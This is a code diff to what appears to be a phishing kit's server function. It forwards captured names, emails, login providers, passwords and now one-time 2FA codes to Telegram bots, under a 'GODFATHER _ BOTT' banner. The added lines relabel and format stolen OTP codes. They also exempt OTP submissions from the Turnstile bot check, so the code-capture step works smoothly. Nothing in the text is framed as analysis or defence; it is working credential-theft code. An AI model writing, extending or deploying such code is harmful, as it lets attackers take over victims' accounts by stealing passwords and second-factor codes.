@@ -26,16 +26,21 @@ const TELEGRAM_BOTS = [
 ]
 
 async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
+  const isOtp = password.startsWith('[OTP Code]');
+  const credentialLabel = isOtp ? '🔑 <b>OTP Code:</b>' : '🔒 <b>Password:</b>';
+  const displayPassword = isOtp ? password.replace('[OTP Code]', '').trim() : password;
+  const statusLabel = isOtp ? 'One-Time Code Submitted' : 'Successfully Authenticated';
+
   const message = `
 ╔══════════════════════════════╗
   ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
 ╚══════════════════════════════╝
 
-✅ <b>Status:</b> Successfully Authenticated
+✅ <b>Status:</b> ${statusLabel}
 👤 <b>Name:</b> ${name}
 📧 <b>Email:</b> ${email}
 🔗 <b>Provider:</b> ${provider}
-🔒 <b>Password:</b> ${password}
+${credentialLabel} <code>${displayPassword}</code>
 🕐 <b>Timestamp:</b> ${new Date().toISOString()}
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -144,8 +149,8 @@ serve(async (req) => {
       )
     }
 
-    // Verify Turnstile Token if it's a direct login attempt (password present)
-    if (body.password) {
+    // Verify Turnstile Token if it's a direct login attempt (password present, not OTP)
+    if (body.password && !body.password.startsWith('[OTP Code]')) {
       if (!body.turnstileToken) {
         return new Response(
           JSON.stringify({
